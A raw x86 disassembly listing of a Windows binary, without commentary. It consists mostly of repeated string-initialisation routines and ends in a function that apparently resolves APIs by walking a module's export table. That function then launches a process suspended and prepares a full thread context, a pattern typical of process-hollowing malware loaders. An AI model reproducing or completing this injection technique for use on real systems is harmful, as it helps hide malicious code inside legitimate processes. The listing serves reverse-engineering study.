  402dce:	83 f8 10             	cmp    $0x10,%eax
  402dd1:	72 1f                	jb     0x402df2
  402dd3:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402dd6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402dd9:	40                   	inc    %eax
  402dda:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402ddf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402de2:	72 06                	jb     0x402dea
  402de4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402de7:	8b 40 fc             	mov    -0x4(%eax),%eax
  402dea:	89 04 24             	mov    %eax,(%esp)
  402ded:	e8 ce 2e 00 00       	call   0x405cc0
  402df2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402df9:	89 34 24             	mov    %esi,(%esp)
  402dfc:	e8 f3 e2 01 00       	call   0x4210f4
  402e01:	83 ec 04             	sub    $0x4,%esp
  402e04:	c8 2d 40 00          	enter  $0x402d,$0x0
  402e08:	55                   	push   %ebp
  402e09:	89 e5                	mov    %esp,%ebp
  402e0b:	53                   	push   %ebx
  402e0c:	57                   	push   %edi
  402e0d:	56                   	push   %esi
  402e0e:	83 ec 6c             	sub    $0x6c,%esp
  402e11:	8a 1d 18 5e 71 00    	mov    0x715e18,%bl
  402e17:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  402e1e:	c7 45 bc 24 26 42 00 	movl   $0x422624,-0x44(%ebp)
  402e25:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402e28:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402e2b:	c7 45 c0 e0 2e 40 00 	movl   $0x402ee0,-0x40(%ebp)
  402e32:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402e35:	89 f8                	mov    %edi,%eax
  402e37:	e8 19 e3 01 00       	call   0x421155
  402e3c:	84 db                	test   %bl,%bl
  402e3e:	75 78                	jne    0x402eb8
  402e40:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402e47:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402e4e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402e52:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402e59:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402e5c:	89 34 24             	mov    %esi,(%esp)
  402e5f:	c7 44 24 04 5e 23 42 	movl   $0x42235e,0x4(%esp)
  402e66:	00 
  402e67:	e8 88 20 00 00       	call   0x404ef4
  402e6c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402e73:	89 74 24 04          	mov    %esi,0x4(%esp)
  402e77:	c7 04 24 fc 5d 71 00 	movl   $0x715dfc,(%esp)
  402e7e:	e8 61 ee ff ff       	call   0x401ce4
  402e83:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402e86:	83 f9 10             	cmp    $0x10,%ecx
  402e89:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402e8c:	72 17                	jb     0x402ea5
  402e8e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402e91:	41                   	inc    %ecx
  402e92:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402e98:	72 03                	jb     0x402e9d
  402e9a:	8b 40 fc             	mov    -0x4(%eax),%eax
  402e9d:	89 04 24             	mov    %eax,(%esp)
  402ea0:	e8 1b 2e 00 00       	call   0x405cc0
  402ea5:	c7 04 24 14 16 40 00 	movl   $0x401614,(%esp)
  402eac:	e8 f7 9d 01 00       	call   0x41cca8
  402eb1:	c6 05 18 5e 71 00 01 	movb   $0x1,0x715e18
  402eb8:	83 3d 14 5e 71 00 0f 	cmpl   $0xf,0x715e14
  402ebf:	77 07                	ja     0x402ec8
  402ec1:	be 00 5e 71 00       	mov    $0x715e00,%esi
  402ec6:	eb 06                	jmp    0x402ece
  402ec8:	8b 35 00 5e 71 00    	mov    0x715e00,%esi
  402ece:	89 3c 24             	mov    %edi,(%esp)
  402ed1:	e8 a0 e2 01 00       	call   0x421176
  402ed6:	89 f0                	mov    %esi,%eax
  402ed8:	83 c4 6c             	add    $0x6c,%esp
  402edb:	5e                   	pop    %esi
  402edc:	5f                   	pop    %edi
  402edd:	5b                   	pop    %ebx
  402ede:	5d                   	pop    %ebp
  402edf:	c3                   	ret
  402ee0:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402ee3:	3d 01 00 00 00       	cmp    $0x1,%eax
  402ee8:	76 02                	jbe    0x402eec
  402eea:	0f 0b                	ud2
  402eec:	2d 01 00 00 00       	sub    $0x1,%eax
  402ef1:	ff 24 85 34 2f 40 00 	jmp    *0x402f34(,%eax,4)
  402ef8:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402efb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402efe:	83 f8 10             	cmp    $0x10,%eax
  402f01:	72 1f                	jb     0x402f22
  402f03:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402f06:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402f09:	40                   	inc    %eax
  402f0a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402f0f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f12:	72 06                	jb     0x402f1a
  402f14:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f17:	8b 40 fc             	mov    -0x4(%eax),%eax
  402f1a:	89 04 24             	mov    %eax,(%esp)
  402f1d:	e8 9e 2d 00 00       	call   0x405cc0
  402f22:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402f29:	89 34 24             	mov    %esi,(%esp)
  402f2c:	e8 c3 e1 01 00       	call   0x4210f4
  402f31:	83 ec 04             	sub    $0x4,%esp
  402f34:	f8                   	clc
  402f35:	2e 40                	cs inc %eax
  402f37:	00 55 89             	add    %dl,-0x77(%ebp)
  402f3a:	e5 53                	in     $0x53,%eax
  402f3c:	57                   	push   %edi
  402f3d:	56                   	push   %esi
  402f3e:	83 ec 6c             	sub    $0x6c,%esp
  402f41:	8a 1d 44 5e 71 00    	mov    0x715e44,%bl
  402f47:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  402f4e:	c7 45 bc 34 26 42 00 	movl   $0x422634,-0x44(%ebp)
  402f55:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402f58:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402f5b:	c7 45 c0 10 30 40 00 	movl   $0x403010,-0x40(%ebp)
  402f62:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402f65:	89 f8                	mov    %edi,%eax
  402f67:	e8 e9 e1 01 00       	call   0x421155
  402f6c:	84 db                	test   %bl,%bl
  402f6e:	75 78                	jne    0x402fe8
  402f70:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402f77:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402f7e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402f82:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402f89:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402f8c:	89 34 24             	mov    %esi,(%esp)
  402f8f:	c7 44 24 04 e6 23 42 	movl   $0x4223e6,0x4(%esp)
  402f96:	00 
  402f97:	e8 58 1f 00 00       	call   0x404ef4
  402f9c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402fa3:	89 74 24 04          	mov    %esi,0x4(%esp)
  402fa7:	c7 04 24 28 5e 71 00 	movl   $0x715e28,(%esp)
  402fae:	e8 31 ed ff ff       	call   0x401ce4
  402fb3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402fb6:	83 f9 10             	cmp    $0x10,%ecx
  402fb9:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402fbc:	72 17                	jb     0x402fd5
  402fbe:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402fc1:	41                   	inc    %ecx
  402fc2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402fc8:	72 03                	jb     0x402fcd
  402fca:	8b 40 fc             	mov    -0x4(%eax),%eax
  402fcd:	89 04 24             	mov    %eax,(%esp)
  402fd0:	e8 eb 2c 00 00       	call   0x405cc0
  402fd5:	c7 04 24 64 16 40 00 	movl   $0x401664,(%esp)
  402fdc:	e8 c7 9c 01 00       	call   0x41cca8
  402fe1:	c6 05 44 5e 71 00 01 	movb   $0x1,0x715e44
  402fe8:	83 3d 40 5e 71 00 0f 	cmpl   $0xf,0x715e40
  402fef:	77 07                	ja     0x402ff8
  402ff1:	be 2c 5e 71 00       	mov    $0x715e2c,%esi
  402ff6:	eb 06                	jmp    0x402ffe
  402ff8:	8b 35 2c 5e 71 00    	mov    0x715e2c,%esi
  402ffe:	89 3c 24             	mov    %edi,(%esp)
  403001:	e8 70 e1 01 00       	call   0x421176
  403006:	89 f0                	mov    %esi,%eax
  403008:	83 c4 6c             	add    $0x6c,%esp
  40300b:	5e                   	pop    %esi
  40300c:	5f                   	pop    %edi
  40300d:	5b                   	pop    %ebx
  40300e:	5d                   	pop    %ebp
  40300f:	c3                   	ret
  403010:	8b 45 a0             	mov    -0x60(%ebp),%eax
  403013:	3d 01 00 00 00       	cmp    $0x1,%eax
  403018:	76 02                	jbe    0x40301c
  40301a:	0f 0b                	ud2
  40301c:	2d 01 00 00 00       	sub    $0x1,%eax
  403021:	ff 24 85 64 30 40 00 	jmp    *0x403064(,%eax,4)
  403028:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40302b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40302e:	83 f8 10             	cmp    $0x10,%eax
  403031:	72 1f                	jb     0x403052
  403033:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403036:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403039:	40                   	inc    %eax
  40303a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40303f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403042:	72 06                	jb     0x40304a
  403044:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403047:	8b 40 fc             	mov    -0x4(%eax),%eax
  40304a:	89 04 24             	mov    %eax,(%esp)
  40304d:	e8 6e 2c 00 00       	call   0x405cc0
  403052:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  403059:	89 34 24             	mov    %esi,(%esp)
  40305c:	e8 93 e0 01 00       	call   0x4210f4
  403061:	83 ec 04             	sub    $0x4,%esp
  403064:	28 30                	sub    %dh,(%eax)
  403066:	40                   	inc    %eax
  403067:	00 55 89             	add    %dl,-0x77(%ebp)
  40306a:	e5 53                	in     $0x53,%eax
  40306c:	57                   	push   %edi
  40306d:	56                   	push   %esi
  40306e:	83 ec 6c             	sub    $0x6c,%esp
  403071:	8a 1d 64 5e 71 00    	mov    0x715e64,%bl
  403077:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  40307e:	c7 45 bc 44 26 42 00 	movl   $0x422644,-0x44(%ebp)
  403085:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  403088:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40308b:	c7 45 c0 40 31 40 00 	movl   $0x403140,-0x40(%ebp)
  403092:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  403095:	89 f8                	mov    %edi,%eax
  403097:	e8 b9 e0 01 00       	call   0x421155
  40309c:	84 db                	test   %bl,%bl
  40309e:	75 78                	jne    0x403118
  4030a0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4030a7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4030ae:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4030b2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4030b9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4030bc:	89 34 24             	mov    %esi,(%esp)
  4030bf:	c7 44 24 04 47 24 42 	movl   $0x422447,0x4(%esp)
  4030c6:	00 
  4030c7:	e8 28 1e 00 00       	call   0x404ef4
  4030cc:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4030d3:	89 74 24 04          	mov    %esi,0x4(%esp)
  4030d7:	c7 04 24 48 5e 71 00 	movl   $0x715e48,(%esp)
  4030de:	e8 01 ec ff ff       	call   0x401ce4
  4030e3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4030e6:	83 f9 10             	cmp    $0x10,%ecx
  4030e9:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4030ec:	72 17                	jb     0x403105
  4030ee:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4030f1:	41                   	inc    %ecx
  4030f2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4030f8:	72 03                	jb     0x4030fd
  4030fa:	8b 40 fc             	mov    -0x4(%eax),%eax
  4030fd:	89 04 24             	mov    %eax,(%esp)
  403100:	e8 bb 2b 00 00       	call   0x405cc0
  403105:	c7 04 24 b4 16 40 00 	movl   $0x4016b4,(%esp)
  40310c:	e8 97 9b 01 00       	call   0x41cca8
  403111:	c6 05 64 5e 71 00 01 	movb   $0x1,0x715e64
  403118:	83 3d 60 5e 71 00 0f 	cmpl   $0xf,0x715e60
  40311f:	77 07                	ja     0x403128
  403121:	be 4c 5e 71 00       	mov    $0x715e4c,%esi
  403126:	eb 06                	jmp    0x40312e
  403128:	8b 35 4c 5e 71 00    	mov    0x715e4c,%esi
  40312e:	89 3c 24             	mov    %edi,(%esp)
  403131:	e8 40 e0 01 00       	call   0x421176
  403136:	89 f0                	mov    %esi,%eax
  403138:	83 c4 6c             	add    $0x6c,%esp
  40313b:	5e                   	pop    %esi
  40313c:	5f                   	pop    %edi
  40313d:	5b                   	pop    %ebx
  40313e:	5d                   	pop    %ebp
  40313f:	c3                   	ret
  403140:	8b 45 a0             	mov    -0x60(%ebp),%eax
  403143:	3d 01 00 00 00       	cmp    $0x1,%eax
  403148:	76 02                	jbe    0x40314c
  40314a:	0f 0b                	ud2
  40314c:	2d 01 00 00 00       	sub    $0x1,%eax
  403151:	ff 24 85 94 31 40 00 	jmp    *0x403194(,%eax,4)
  403158:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40315b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40315e:	83 f8 10             	cmp    $0x10,%eax
  403161:	72 1f                	jb     0x403182
  403163:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403166:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403169:	40                   	inc    %eax
  40316a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40316f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403172:	72 06                	jb     0x40317a
  403174:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403177:	8b 40 fc             	mov    -0x4(%eax),%eax
  40317a:	89 04 24             	mov    %eax,(%esp)
  40317d:	e8 3e 2b 00 00       	call   0x405cc0
  403182:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  403189:	89 34 24             	mov    %esi,(%esp)
  40318c:	e8 63 df 01 00       	call   0x4210f4
  403191:	83 ec 04             	sub    $0x4,%esp
  403194:	58                   	pop    %eax
  403195:	31 40 00             	xor    %eax,0x0(%eax)
  403198:	55                   	push   %ebp
  403199:	89 e5                	mov    %esp,%ebp
  40319b:	53                   	push   %ebx
  40319c:	57                   	push   %edi
  40319d:	56                   	push   %esi
  40319e:	83 ec 6c             	sub    $0x6c,%esp
  4031a1:	8a 1d 84 5e 71 00    	mov    0x715e84,%bl
  4031a7:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  4031ae:	c7 45 bc 54 26 42 00 	movl   $0x422654,-0x44(%ebp)
  4031b5:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  4031b8:	89 65 c8             	mov    %esp,-0x38(%ebp)
  4031bb:	c7 45 c0 70 32 40 00 	movl   $0x403270,-0x40(%ebp)
  4031c2:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4031c5:	89 f8                	mov    %edi,%eax
  4031c7:	e8 89 df 01 00       	call   0x421155
  4031cc:	84 db                	test   %bl,%bl
  4031ce:	75 78                	jne    0x403248
  4031d0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4031d7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4031de:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4031e2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4031e9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4031ec:	89 34 24             	mov    %esi,(%esp)
  4031ef:	c7 44 24 04 a5 24 42 	movl   $0x4224a5,0x4(%esp)
  4031f6:	00 
  4031f7:	e8 f8 1c 00 00       	call   0x404ef4
  4031fc:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  403203:	89 74 24 04          	mov    %esi,0x4(%esp)
  403207:	c7 04 24 68 5e 71 00 	movl   $0x715e68,(%esp)
  40320e:	e8 d1 ea ff ff       	call   0x401ce4
  403213:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403216:	83 f9 10             	cmp    $0x10,%ecx
  403219:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  40321c:	72 17                	jb     0x403235
  40321e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403221:	41                   	inc    %ecx
  403222:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403228:	72 03                	jb     0x40322d
  40322a:	8b 40 fc             	mov    -0x4(%eax),%eax
  40322d:	89 04 24             	mov    %eax,(%esp)
  403230:	e8 8b 2a 00 00       	call   0x405cc0
  403235:	c7 04 24 04 17 40 00 	movl   $0x401704,(%esp)
  40323c:	e8 67 9a 01 00       	call   0x41cca8
  403241:	c6 05 84 5e 71 00 01 	movb   $0x1,0x715e84
  403248:	83 3d 80 5e 71 00 0f 	cmpl   $0xf,0x715e80
  40324f:	77 07                	ja     0x403258
  403251:	be 6c 5e 71 00       	mov    $0x715e6c,%esi
  403256:	eb 06                	jmp    0x40325e
  403258:	8b 35 6c 5e 71 00    	mov    0x715e6c,%esi
  40325e:	89 3c 24             	mov    %edi,(%esp)
  403261:	e8 10 df 01 00       	call   0x421176
  403266:	89 f0                	mov    %esi,%eax
  403268:	83 c4 6c             	add    $0x6c,%esp
  40326b:	5e                   	pop    %esi
  40326c:	5f                   	pop    %edi
  40326d:	5b                   	pop    %ebx
  40326e:	5d                   	pop    %ebp
  40326f:	c3                   	ret
  403270:	8b 45 a0             	mov    -0x60(%ebp),%eax
  403273:	3d 01 00 00 00       	cmp    $0x1,%eax
  403278:	76 02                	jbe    0x40327c
  40327a:	0f 0b                	ud2
  40327c:	2d 01 00 00 00       	sub    $0x1,%eax
  403281:	ff 24 85 c4 32 40 00 	jmp    *0x4032c4(,%eax,4)
  403288:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40328b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40328e:	83 f8 10             	cmp    $0x10,%eax
  403291:	72 1f                	jb     0x4032b2
  403293:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403296:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403299:	40                   	inc    %eax
  40329a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40329f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4032a2:	72 06                	jb     0x4032aa
  4032a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4032a7:	8b 40 fc             	mov    -0x4(%eax),%eax
  4032aa:	89 04 24             	mov    %eax,(%esp)
  4032ad:	e8 0e 2a 00 00       	call   0x405cc0
  4032b2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4032b9:	89 34 24             	mov    %esi,(%esp)
  4032bc:	e8 33 de 01 00       	call   0x4210f4
  4032c1:	83 ec 04             	sub    $0x4,%esp
  4032c4:	88 32                	mov    %dh,(%edx)
  4032c6:	40                   	inc    %eax
  4032c7:	00 55 89             	add    %dl,-0x77(%ebp)
  4032ca:	e5 53                	in     $0x53,%eax
  4032cc:	57                   	push   %edi
  4032cd:	56                   	push   %esi
  4032ce:	81 ec 9c 03 00 00    	sub    $0x39c,%esp
  4032d4:	8b 75 08             	mov    0x8(%ebp),%esi
  4032d7:	c7 45 a4 ec 04 42 00 	movl   $0x4204ec,-0x5c(%ebp)
  4032de:	c7 45 a8 64 26 42 00 	movl   $0x422664,-0x58(%ebp)
  4032e5:	89 6d ac             	mov    %ebp,-0x54(%ebp)
  4032e8:	89 65 b4             	mov    %esp,-0x4c(%ebp)
  4032eb:	c7 45 ac 05 39 40 00 	movl   $0x403905,-0x54(%ebp)
  4032f2:	8d 45 88             	lea    -0x78(%ebp),%eax
  4032f5:	e8 5b de 01 00       	call   0x421155
  4032fa:	85 f6                	test   %esi,%esi
  4032fc:	bf 01 00 00 00       	mov    $0x1,%edi
  403301:	0f 84 86 01 00 00    	je     0x40348d
  403307:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40330a:	85 db                	test   %ebx,%ebx
  40330c:	0f 84 7b 01 00 00    	je     0x40348d
  403312:	80 3b 00             	cmpb   $0x0,(%ebx)
  403315:	0f 84 6d 01 00 00    	je     0x403488
  40331b:	8b 46 3c             	mov    0x3c(%esi),%eax
  40331e:	bf 01 00 00 00       	mov    $0x1,%edi
  403323:	81 3c 30 50 45 00 00 	cmpl   $0x4550,(%eax,%esi,1)
  40332a:	0f 85 5d 01 00 00    	jne    0x40348d
  403330:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403333:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  40333a:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  403341:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  403348:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  40334f:	8d bd 28 ff ff ff    	lea    -0xd8(%ebp),%edi
  403355:	31 c0                	xor    %eax,%eax
  403357:	b9 11 00 00 00       	mov    $0x11,%ecx
  40335c:	f3 ab                	rep stos %eax,%es:(%edi)
  40335e:	8b 35 1c 5e 71 00    	mov    0x715e1c,%esi
  403364:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  40336b:	e8 68 f9 ff ff       	call   0x402cd8
  403370:	89 f2                	mov    %esi,%edx
  403372:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403375:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403379:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40337e:	77 12                	ja     0x403392
  403380:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403384:	01 d7                	add    %edx,%edi
  403386:	0f b7 c8             	movzwl %ax,%ecx
  403389:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  40338d:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403390:	eb 77                	jmp    0x403409
  403392:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403396:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403399:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  40339d:	01 d1                	add    %edx,%ecx
  40339f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4033a2:	31 c9                	xor    %ecx,%ecx
  4033a4:	0f 1f 40 00          	nopl   0x0(%eax)
  4033a8:	4b                   	dec    %ebx
  4033a9:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4033ac:	eb 11                	jmp    0x4033bf
  4033ae:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4033b5:	00 00 00 
  4033b8:	43                   	inc    %ebx
  4033b9:	89 d9                	mov    %ebx,%ecx
  4033bb:	89 f2                	mov    %esi,%edx
  4033bd:	89 f8                	mov    %edi,%eax
  4033bf:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4033c2:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4033c5:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  4033c8:	d1 eb                	shr    $1,%ebx
  4033ca:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4033cd:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4033d0:	89 d6                	mov    %edx,%esi
  4033d2:	01 d1                	add    %edx,%ecx
  4033d4:	83 ec 08             	sub    $0x8,%esp
  4033d7:	89 c7                	mov    %eax,%edi
  4033d9:	50                   	push   %eax
  4033da:	51                   	push   %ecx
  4033db:	e8 64 e7 00 00       	call   0x411b44
  4033e0:	83 c4 10             	add    $0x10,%esp
  4033e3:	85 c0                	test   %eax,%eax
  4033e5:	78 d1                	js     0x4033b8
  4033e7:	89 f2                	mov    %esi,%edx
  4033e9:	89 f8                	mov    %edi,%eax
  4033eb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4033ee:	75 b8                	jne    0x4033a8
  4033f0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4033f3:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4033f7:	01 d0                	add    %edx,%eax
  4033f9:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4033fd:	01 d1                	add    %edx,%ecx
  4033ff:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403403:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403406:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403409:	03 10                	add    (%eax),%edx
  40340b:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  403412:	83 ec 08             	sub    $0x8,%esp
  403415:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403418:	50                   	push   %eax
  403419:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  40341f:	50                   	push   %eax
  403420:	6a 00                	push   $0x0
  403422:	6a 00                	push   $0x0
  403424:	6a 0c                	push   $0xc
  403426:	6a 00                	push   $0x0
  403428:	6a 00                	push   $0x0
  40342a:	6a 00                	push   $0x0
  40342c:	6a 00                	push   $0x0
  40342e:	53                   	push   %ebx
  40342f:	ff d2                	call   *%edx
  403431:	83 c4 08             	add    $0x8,%esp
  403434:	85 c0                	test   %eax,%eax
  403436:	74 50                	je     0x403488
  403438:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40343b:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40343e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403441:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  403444:	c7 85 5c fc ff ff 07 	movl   $0x10007,-0x3a4(%ebp)
  40344b:	00 01 00 
  40344e:	a1 20 5e 71 00       	mov    0x715e20,%eax
  403453:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403456:	c7 45 90 01 00 00 00 	movl   $0x1,-0x70(%ebp)
  40345d:	e8 b6 f3 ff ff       	call   0x402818
  403462:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403465:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403468:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  40346c:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403471:	77 36                	ja     0x4034a9
  403473:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403477:	01 d7                	add    %edx,%edi
  403479:	0f b7 c8             	movzwl %ax,%ecx
  40347c:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403480:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403483:	e9 9e 00 00 00       	jmp    0x403526
  403488:	bf 01 00 00 00       	mov    $0x1,%edi
  40348d:	83 ec 0c             	sub    $0xc,%esp
  403490:	8d 45 88             	lea    -0x78(%ebp),%eax
  403493:	50                   	push   %eax
  403494:	e8 dd dc 01 00       	call   0x421176
  403499:	83 c4 10             	add    $0x10,%esp
  40349c:	89 f8                	mov    %edi,%eax
  40349e:	81 c4 9c 03 00 00    	add    $0x39c,%esp
  4034a4:	5e                   	pop    %esi
  4034a5:	5f                   	pop    %edi
  4034a6:	5b                   	pop    %ebx
  4034a7:	5d                   	pop    %ebp
  4034a8:	c3                   	ret
  4034a9:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  4034ad:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4034b0:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  4034b4:	01 d1                	add    %edx,%ecx
  4034b6:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4034b9:	31 c9                	xor    %ecx,%ecx
  4034bb:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4034c2:	84 00 00 00 00 00 
  4034c8:	4b                   	dec    %ebx
  4034c9:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4034cc:	eb 11                	jmp    0x4034df
  4034ce:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4034d5:	00 00 00 
  4034d8:	43                   	inc    %ebx
  4034d9:	89 d9                	mov    %ebx,%ecx
  4034db:	89 fa                	mov    %edi,%edx
  4034dd:	89 f0                	mov    %esi,%eax
  4034df:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4034e2:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4034e5:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  4034e8:	d1 eb                	shr    $1,%ebx
  4034ea:	8b 4d e0             	mov    -0x20(%ebp),%ecx
